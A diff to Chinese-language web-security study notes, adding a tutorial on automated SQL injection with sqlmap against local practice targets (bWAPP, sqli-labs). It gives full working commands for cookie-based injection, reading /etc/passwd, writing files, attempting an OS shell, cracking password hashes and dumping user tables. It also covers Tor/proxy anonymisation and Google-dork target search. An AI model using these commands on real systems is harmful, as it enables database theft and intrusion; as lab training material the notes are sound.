@@ -2419,6 +2419,7 @@ curl -d "hacker=echo getcwd();" http://127.0.0.1/images/shell.php
   - docker run -d -p 0.0.0.0:80:80 registry.cn-shanghai.aliyuncs.com/yhskc/sqli-labs
   - docker ps
     - 看到已经启动成功
+  - docker stop fervent_nightingale
 - 关闭占据 80 端口的 bwapp，打开 sqli-labs，
 - 仅映射到 80 端口，若映射到其他端口，实验跳转过程不方便。 
 
@@ -2995,15 +2996,244 @@ Linux 用户分为管理员和普通用户，普通用户又分为系统用户�
 
 ### 自动化注入 
 
+#### sqlmap 工具
+
+- 一款功能强大集成了多种数据库识别及注入方式，多用于识别和利用Web 应用程序注入漏洞的工具。
+- 优点在于**集成了大量 payload**,对检测与利用的自动化处理（数据库指纹、访问底层文件系统、执行命令）。
+- payload 原理与前面 SQL 注入相似，利用数据库执行非预期的语句，但更加复杂，由专门研究数据库的人编写。Kali 操作系统内置，其他平台需下载脚本文件。 
+- 不仅包含了前面所说几种 MySQL 的 SQL 注入利用方式，还包含了其他种类的数据库的。
+- 前面写的 Python 时间盲注脚本，也算一个自动脚本，具有相应的针对性，但是功能无 sqlmap 强大。 
+- 官网：http://sqlmap.org/ 
+
+
+
+#### sqlmap 特性 
+
+- 对如下 DBMS 的全面支持：
+  - MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2,SQLite, Firebird, Sybase, SAP MaxDB, Informix, MariaDB, MemSQL, TiDB,CockroachDB, HSQLDB, H2, MonetDB, Apache Derby, Amazon Redshift,Vertica, Mckoi, Presto, Altibase, MimerSQL, CrateDB, Greenplum, Drizzle,Apache Ignite, Cubrid, InterSystems Cache, IRIS, eXtremeDB and FrontBase
+- 对六种 SQL 注入技巧的全面支持：
+  - boolean-based blind, time-based blind, error-based, UNION query-based,stacked queries and out-of-band 
+- 对直连数据库的支持：
+  - 不需要通过 SQL 注入，只需要提供 DBMS 的账户信息、IP地址、端口及数据库名称。
+- 对枚举功能的支持：
+  - 包括用户、密码 HASH、权限、角色、数据库、数据表、数据列。
+- 密码 HASH 相关支持：
+  - 自动识别 HASH 格式以及自动实施基于字典的破解攻击。
+- 对 DUMP 数据的功能支持：
+  - 可以根据用户选择进行全部导出/部分导出。 
+- 对搜索功能的强大支持：
+  - 该功能非常实用，可用于搜索特定数据库名、所有数据库中的特定名称数据表、所有数据表中特定名称的数据列。
+- 对下载/上传文件的支持：
+  - 有效支持的 DBMS 包括 MySQL、PostgreSQL、MS SQL Server。
+- 对命令执行的支持：
+  - 有效支持的 DBMS 包括 MySQL、PostgreSQL、MS SQL Server。
+- 对建立一个基于OOB的TCP连接的支持：
+  - 连接的 Channel 支持交互式命令行、Meterpreter session 以及 VNC session。
+- 对数据库提权的支持：
+  - 该支持通过 msf 中 meterpreter 的 getsystem 命令 
+
+
+
+#### sqlmap 的选项
+
+-  选项 -v
+  -  0 ： 只显示 python 的 error 和 critical 级别的信息
+  -  1 ： 显示 information 和 warning 级别的信息
+  -  2 ： 显示 debug 级别的信息
+  -  3 ： 额外显示注入的 payload （很有用，测试过程的记录）
+  -  4 ： 额外显示 HTTP 请求内容
+  -  5 ： 额外显示 HTTP 响应头
+  -  6 ： 额外显示 HTTP 响应页面内容 
+-  选项 -d
+   -  通过 sqlmap 直接连接一个数据库实例，该选项接收一个连接字符串作为参数
+   -  示例：
+      -  DBMS://USER:PASSWORD@DBMS_IP:DBMS_PORT/DATABASE_NAME (MySQL, Oracle, Microsoft SQL Server, PostgreSQL, etc.)
+      -  DBMS://DATABASE_FILEPATH (SQLite, Microsoft Access, Firebird, etc.) 
+-  选项 -u 或 --url
+   -  选定一个 url 目标，并执行 SQL 注入攻击
+   -  示例：
+      -  python sqlmap.py -u "http://www.target.com/vuln.php?id=1" -f --banner --dbs --users
+-  选项 -d 或 --data
+   -  默认的 HTTP 请求发送方式是 GET，可以通过该选项指定为 POST
+   -  示例：
+      -  python sqlmap.py -u "http://www.target.com/vuln.php" --data="id=1" -f --banner --dbs --users 
+-  选项 --cookie, --cookie-del, --load-cookies
+   -  设定 Cookie 流程：
+      -  通过浏览器登录Web App；
+      -  从 Burp Suite 或浏览器内部取得 Cookie；
+      -  通过 --cookie 选项设置取得的 Cookie；
+   -  说明：
+      -  在 sqlmap 执行注入攻击的过程中，如果浏览器返回了 Set-Cookie的headers，那么 sqlmap 会自动识别这一指令，并更新对应的 Cookie，如果我们已经通过 --cookie 设定了Cookie 的数值，那么 sqlmap 会向我们确认是否进行更新。 
+-  选项 --user-agent 或 --random-agent
+   -  默认情况下，sqlmap 发送的 HTTP 请求中 User-Agent 值如下：
+      -  sqlmap/1.0-dev-xxxxxxx (http://sqlmap.org)
+      -  可通过该选项进行修改
+   -  思考：
+      -  我们前几节课讲过一次关于 HTTP 头注入，那么通过 sqlmap 是否可以自动化呢？
+      -  Host 及 Referer 是否也可以设置及注入呢？ 
+-  选项 --proxy
+   -  在实战场景下非常重要，允许 sqlmap 的请求都通过我们设置的 proxy 进行发送，无论是出于隐藏自身 IP 地址的目的，还是绕过 IP 限制，都非常实用。
+-  选项 --tor, --tor-port, --tor-type 以及 --check-tor
+   -  通过配置 Tor Client 以及 Privoxy，我们就可以启用 –tor 选项。
+   -  该选项可以使得 sqlmap 的请求通过 Tor 网络进行发送，以达到匿名的目的。
+   -  同时，我们还可以通过 --tor-port 以及 --tor-type 设置所使用的的 Tor Proxy 类型。
+   -  --check-tor 则是用来检测 Tor 网络是否配置且连接正常。 
 
 
 
 
 
+#### 携带 cookie 实战
+
+- bWAPP 漏洞选择：
+
+  - SQL Injection (GET/SELECTED)
+
+- 实战内容：
+
+  1. 设定 Cookie 给 sqlmap；
+  2. 自动化注入获取数据库信息（包括数据库账号、用户名、密码）。
+
+- 测试步骤
+
+  -  登录靶机，选择漏洞，打开浏览器控制台，在网络中进行抓包，获得 cookie，Cookie: csrftoken=ARDPhdClAyvSmEJcAmE953XMbXI527GrUDAbbHZ1sIpUwsYaW8MBwDaFBd4ksUu1; security_level=0; PHPSESSID=s1fmkgfcs8tfqhosqbjak6ijb2
+
+  - 下载 sqlmap ，网址：http://sqlmap.org/
+
+  - 进入 sqlmap，输入： python .\sqlmap.py --cookie "security_level=0; PHPSESSID=s1fmkgfcs8tfqhosqbjak6ijb2" -u "http://127.0.0.1/sqli_2.php?movie=1&action=go" -f --banner --dbs --users
+
+  - 输出结果显示
+
+    - ```sh
+      web server operating system: Linux Ubuntu
+      web application technology: Apache 2.4.7, PHP 5.5.9
+      back-end DBMS operating system: Linux Ubuntu
+      back-end DBMS: active fingerprint: MySQL >= 5.5
+                     comment injection fingerprint: MySQL 5.5.47
+                     banner parsing fingerprint: MySQL 5.5.47
+                     html error message fingerprint: MySQL
+      banner: '5.5.47-0ubuntu0.14.04.1'
+      
+      database management system users [5]:
+      [*] 'admin'@'%'
+      [*] 'root'@'127.0.0.1'
+      [*] 'root'@'::1'
+      [*] 'root'@'fffcfba80832'
+      [*] 'root'@'localhost'
+      
+      available databases [4]:
+      [*] bWAPP
+      [*] information_schema
+      [*] mysql
+      [*] performance_schema
+      ```
 
 
 
+#### user-agent 实战
 
+- bWAPP 漏洞选择：
+  - SQL Injection – Stored (User-Agent)
+- 实战内容：
+  - 修改 User-Agent；
+  - 自动化注入 User-Agent； 
+- 测试步骤
+  -  登录靶机，选择漏洞，打开浏览器控制台，在网络中进行抓包，获得 cookie，Cookie: csrftoken=ARDPhdClAyvSmEJcAmE953XMbXI527GrUDAbbHZ1sIpUwsYaW8MBwDaFBd4ksUu1; security_level=0; PHPSESSID=s1fmkgfcs8tfqhosqbjak6ijb2
+  - 进入 sqlmap，输入： python .\sqlmap.py --cookie "security_level=0; PHPSES
+    SID=s1fmkgfcs8tfqhosqbjak6ijb2" -u "http://127.0.0.1/sqli_17.php" -f --banner --dbs --users
+    - 进入浏览器刷新后，可以看到 **User-Agent** 是 sqlmap/1.5.4.5#dev (http://sqlmap.org)
+  - 继续输入，python .\sqlmap.py --cookie "security_level=0; PHPSES
+    SID=s1fmkgfcs8tfqhosqbjak6ijb2" -u "http://127.0.0.1/sqli_17.php" --user-agent 'helloworld' -f --banner --dbs --users
+    - 刷新后，可以看到  **User-Agent** 是 helloworld
+    - 实现了 user-agent 的更改
+  - 注入测试，输入 python .\sqlmap.py --cookie "security_level=0; PHPSES
+    SID=s1fmkgfcs8tfqhosqbjak6ijb2" -u "http://127.0.0.1/sqli_17.php" -f --banner --dbs --users -v 3
+    - 会报错，直接停止
+  - 更改后，输入 python .\sqlmap.py --cookie "security_level=0; PHPSES
+    SID=s1fmkgfcs8tfqhosqbjak6ijb2; security=low" -u "http://127.0.0.1/sqli_17.php" -f --banner --dbs --users -v 3 --level 3
+    - 添加 level 的数值，完成注入
+    - 看到数据库的信息，表的信息，用户的信息，但是需要花费好长时间
+  - 测试，此时不输入level的时候，python .\sqlmap.py --cookie "security_level=0; PHPSES
+    SID=s1fmkgfcs8tfqhosqbjak6ijb2; security=low" -u "http://127.0.0.1/sqli_17.php" -f --banner --dbs --users -v 3
+    - 很快就给出了结果，这个结果是直接从本地缓存的文件中获得
+    - SQLMap的默认输出路径是在
+      - C:/Users/用户名/.sqlmap/output/下的。
+      - 但是我在windows中没找到，很不解！
+      - 最终被我发现了，每一次的内容会被保存在这个目录下，C:\Users\rmliu\AppData\Local\sqlmap\output\127.0.0.1
+
+
+
+#### sqli-labs 靶机实战
+
+- 下载安装靶机，启动 docker start fervent_nightingale
+- 选项 -g google hacking 
+  - python sqlmap.py -g "inurl:.jsp?id=12"
+  - python sqlmap.py -g "inurl:.php?id=12" 
+- 选项 --risk=1-3 --level=1-5 
+  - 默认都是一, 
+  - level 级别升高，会加更多的测试，2 会加 cookie 的测试，3 会加 Useragent 头的注入测试
+  - 检测 host 头注入点的是：5
+  - sql-master/data/xml/payloads 目录下有详细的 payload。
+  - 内容 risk 级别升高会加 or 和 Update 可能对数据库表内容进行修改。往往不是我们所期望的，所以谨慎使用。
+  - 如果不输入 ？id=1 sqlmap 自动指定参数，可以观察到大量 payload，而 risk 1 level 1会直接退出。 
+  - 测试
+    - python sqlmap.py -u "http://127.0.0.1/Less-31/?id=1" --risk 3 --level 5
+      - 可以注入
+
+    - python sqlmap.py -u "http://127.0.0.1/Less-31/"
+      - 尝试一些后迅速退出
+
+    - python sqlmap.py -u "http://127.0.0.1/Less-31/" --risk 3 --level 5 
+      - 大量payload,尝试所有可能的注入点 
+- 选项 --privileges --is-dba 
+  - python sqlmap.py -u "http://127.0.0.1/Less-31/?id=1" --is-dba 
+    - current user is DBA: True
+  - python sqlmap.py -u "http://127.0.0.1/Less-31?id=1" --privileges
+- 选项 --file-read --file-write --file-dest 
+  - python sqlmap.py -u "http://127.0.0.1/Less-31?id=1" --file-read "/etc/passwd"
+    - cat C:\Users\rmliu\AppData\Local\sqlmap\output\127.0.0.1\files\_etc_passwd
+    - 可以看到对应的数据内容
+  - 本地写入一个 ip.txt 的文件，cat .\ip.txt
+    - python sqlmap.py -u "http://127.0.0.1/Less-31?id=1" --file-write ".\ip.txt" --file-dest "/tmp/ip.txt"
+    - 进入靶机的docker中，docker exec -it fervent_nightingale bash
+    - 可以看到同样的内容，cat /tmp/ip.txt
+- 选项 --os-cmd --shell 
+  - 需要具有文件夹写权限（root 更好）
+  - 网站的路径，里面提供部分默认选项
+  - PHP 主动转义的功能关闭 (magic_quotes_gpc) 
+  - 测试
+    - python sqlmap.py -u "http://127.0.0.1/Less-31?id=1" --os-shell
+    - 可以直接进行交互式测试，我在演示测试的时候，失败了！
+
+
+
+#### sqlmap 脱库实战
+
+- 启动 bWAPP 靶机，选择bug类型：Choose your bug: SQL Injection (GET/Select)
+- 打开浏览器控制台，获取 cookie
+- 设置 level 3 测试
+  - python .\sqlmap.py --cookie "security_level=0; PHPSESSID=rpue374g2nf04m3tesuel7huc7" -u "http://127.0.0.1/sqli_2.php?movie=1&action=go" --level 3
+- 获取数据库名称
+  - python .\sqlmap.py --cookie "security_level=0; PHPSESSID=rpue374g2nf04m3tesuel7huc7" -u "http://127.0.0.1/sqli_2.php?movie=1&action=go" -dbs
+  - 枚举了数据有哪些 
+- 获取bWAPP 数据库的所有数据表
+  - python .\sqlmap.py --cookie "security_level=0; PHPSESSID=rpue374g2nf04m3tesuel7huc7" -u "http://127.0.0.1/sqli_2.php?movie=1&action=go" -dbs -D bWAPP -tables
+  - 指定了具体数据库的同时指定了数据表 
+- 获取 users  数据表的所有列
+  - python .\sqlmap.py --cookie "security_level=0; PHPSESSID=rpue374g2nf04m3tesuel7huc7" -u "http://127.0.0.1/sqli_2.php?movie=1&action=go" -dbs -D bWAPP -tables -T users --columns
+- 获取用户表中 login,password 列 schema
+  - python .\sqlmap.py --cookie "security_level=0; PHPSESSID=rpue374g2nf04m3tesuel7huc7" -u "http://127.0.0.1/sqli_2.php?movie=1&action=go" -dbs -D bWAPP -tables -T users -columns -C login,password
+- 密码爆破
+  - 在显示表的情况下，使用了默认密码字典进行 Hash 转换，如果默认的密码字典不足，到网上有专门的 md5 彩虹表碰撞网站。
+- 脱库 
+  - python .\sqlmap.py --cookie "security_level=0; PHPSESSID=rpue374g2nf04m3tesuel7huc7" -u "http://127.0.0.1/sqli_2.php?movie=1&action=go" -dbs -D bWAPP -tables -T users -columns -C login,password -dump-all
+  - 使用工具的 –dump-all 参数能轻松的把整个数据库数据窃取，也就是脱库。 
+  - 此时就可以去本机查看输出的结果了，table 'bWAPP.movies' dumped to CSV file 'C:\Users\rmliu\AppData\Local\sqlmap\output\127.0.0.1\dump\bWAPP\movies.csv'
+  - 在这个过程中，由于会在本机进行彩虹表碰撞，速度较慢，耐心等待！
+
+
+
+### 自动化注入之 FuzzDB + Burp 
 
 
 
